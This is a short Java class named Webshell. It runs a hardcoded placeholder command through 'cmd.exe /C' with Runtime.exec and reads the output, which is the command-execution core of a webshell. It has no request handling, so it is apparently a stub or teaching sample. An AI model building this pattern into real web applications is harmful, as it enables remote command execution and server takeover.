package git;


import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Webshell {

	public static void main(String[] args) {
		String cmd = "requestCommand";
		String output = "";

		if (cmd != null) {
			String s = null;
			try {
				Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
				BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
				while ((s = sI.readLine()) != null) {
					output += s;
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

}